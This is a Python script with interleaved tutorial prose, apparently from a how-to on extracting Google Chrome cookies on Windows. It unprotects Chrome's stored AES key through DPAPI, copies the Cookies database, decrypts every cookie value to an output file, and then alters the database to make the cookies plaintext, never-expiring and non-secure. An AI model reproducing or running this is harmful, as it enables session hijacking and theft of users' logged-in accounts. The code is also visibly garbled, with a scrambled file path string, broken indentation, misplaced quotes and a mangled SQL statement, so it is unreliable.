'''
$ pip install pycryptodome pypiwin32
'''

import os, json, base64, sqlite3, shutil, win32crypt, sys
from datetime import datetime , timedelta

# pip install pypiwin32
import win32crypt

# pip install pycryptodome
from Crypto . Cipher import AES

def get_chrome_datetime ( chromedate ):
    """Return a 'datetime.datetime' object from a chrome format datetime
    Since 'chromedate' is formatted as the number of microseconds since January, 1601
    """
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds= chromedate )

        except Exception as e:
            print(f"Error: { e } , chromedate: { chromedate } " )
            return chromedate

        else:
            return ""

def get_encryption_key ():
    local_state_path = os.path.join(os.environ["USERPROFILE" ], "AppData" , "Loca"User Data" , "Local State" )l" , "Google" , "Chrome" ,

    with open ( local_state_path , "r" , encoding = "utf-8" ) as f:
        local_state = f.read()
        local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key" ])

        # remove 'DPAPI' str
        key = key[5:]

        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None , 0 )[ 1 ]


def decrypt_data ( data , key ):
    try:
        # get the initialization vector
        iv = data[3: 15]

        data = data[15:]

        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher . decrypt ( data )[:- 16 ]. decode ()

    except:
        try:
            return str ( win32crypt . CryptUnprotectData ( data , None , None , None , 0 )[ 1 ])
        except:
            # not supported
            return ""

def main ( output_file ):
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData" , "Local" , "Google" , "Chrome" , "User Data" , "Default" , "Network" , "Cookies" )

    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"

    if not os . path . isfile ( filename ):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)

        '''
        The file containing the cookies data is located as defined in the db_path
        variable. We need to copy it to the current directory, as the database will be locked when the Chrome browser is open.
        
        Connecting to the SQLite database:
        '''

        # connect to the database
        db = sqlite3.connect(filename)

        # ignore decoding errors
        db.text_factory = lambda b : b .decode( errors = "ignore" )
        cursor = db . cursor ()

        # get the cookies from 'cookies' table
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies
        """)

        # you can also search by domain, e.g thepythoncode.com
        # cursor.execute("""
        # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
        # FROM cookies
        # WHERE host_key like '%thepythoncode.com%'""")

        '''
        After we connect to the database, we ignore decoding errors in case there are any; we then query the cookies cursor.execute()
        table with the function to get all cookies stored in this file.
        You can filter cookies by a domain name, as shown in the commented code.
        Now let's get the AES key and iterate over the rows of cookies table and decrypt all encrypted data:
        '''
        # get the AES key
        key = get_encryption_key()

        for host_key, name, value, creation_utc, last_access_utc, expires_utc , encrypted_value in cursor . fetchall ():
            if not value :
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                # already decrypted
                decrypted_value = value

                with open ( output_file ) as f :
                    print(f"""
                    Host: { host_key }
                    Cookie name: { name }
                    Cookie value (decrypted): { decrypted_value }
                    Creation datetime (UTC): { get_chrome_datetime (
                        creation_utc)}
                    Last access datetime (UTC): {get_chrome_datetime
                    (last_access_utc)}
                    Expires datetime (UTC): {get_chrome_datetime(
                        expires_utc)}
                          
                          =====================================
                    , file = f ) """)

                    cursor.execute("""
                        UPDATE cookies SET value = ?, has_expires = 1,
                        expires_utc = 99999999999999999, is_persistent = 1, is_secure= 0
                        
                        WHERE host_key = ?
                        AND name = ?.... , ( decrypted_value , host_key ,
                        name ))
                    """)

                    # commit changes
                    db.commit()

                    # close connection
                    db.close()

                    try:
                        # try to remove the copied db file
                        os.remove(filename)
                    except:
                        pass


'''
We use our previously defined decrypt_data()
decrypt the encrypted_value
function to
column; we print the results and
set the value column to the decrypted data. We also make the
cookie persistent by setting is_persistent
to 1 and is_secure
0 to indicate that it is no longer encrypted.
Finally, let's call the main function:
'''

if __name__ == "__main__" :
    output_file = sys . argv [ 1 ]
    main(output_file)

'''
$ python chrome_cookie.py cookies.txt
'''